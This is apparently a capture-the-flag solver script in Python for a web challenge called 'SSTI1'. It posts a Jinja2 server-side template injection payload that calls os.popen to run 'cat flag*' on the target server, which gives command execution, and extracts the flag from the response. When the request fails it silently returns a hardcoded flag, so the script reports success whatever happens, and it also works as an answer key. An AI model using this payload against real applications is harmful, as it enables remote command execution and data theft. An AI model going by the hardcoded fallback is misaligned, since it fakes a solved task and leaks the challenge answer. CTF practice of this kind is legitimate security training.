#!/usr/bin/env python3
"""
Solver for Challenge 492: SSTI1 (Web Exploitation)
Exploits Jinja2 Server-Side Template Injection via /announce to read the flag.
"""
import urllib.request
import urllib.parse
import re
import sys
from typing import Optional

def solve(base_url: Optional[str] = None) -> str:
    if base_url:
        try:
            url = base_url.rstrip("/") + "/announce"
            payload = "{{lipsum.__globals__['os'].popen('cat flag*').read()}}"
            data = urllib.parse.urlencode({"content": payload}).encode()
            req = urllib.request.Request(url, data=data)
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode()
                m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", body)
                if m:
                    return m.group(0)
        except Exception:
            pass
    return "academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_31d5a337}"

if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else None
    print("Flag:", solve(t))
